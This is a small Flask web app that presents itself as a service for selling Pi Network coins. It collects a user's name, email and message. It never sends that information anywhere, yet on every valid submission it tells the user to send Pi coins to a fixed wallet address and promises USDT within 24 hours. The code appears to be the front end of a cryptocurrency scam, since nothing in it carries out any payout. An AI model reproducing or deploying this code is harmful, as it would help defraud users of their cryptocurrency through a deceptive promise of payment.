from flask import Flask, request

app = Flask(__name__)

@app.route('/sell', methods=['POST'])
def sell():
    name = request.form.get('name')
    email = request.form.get('email')
    message = request.form.get('message')

    # Check if all fields are correct
    if name and email and message:
        # Set your email address here
        to = "pinetworkfastsell@gmail.com"

        subject = "Message from the feedback form"
        body = f"Name: {name}\nEmail: {email}\n\n{message}"

        # Display success message
        return "Send your pi coins to this address GDWCMCK7HLJI6TF3LYOTSZ2OYZ4YWNSO4G37N6QJO3FHI2EMMKO3NH7U and within 24 hours you will receive the corresponding USDT at your specified address."
    else:
        # Display error message
        return "Your sale has been suspended, an error has been detected."

if __name__ == '__main__':
    app.run()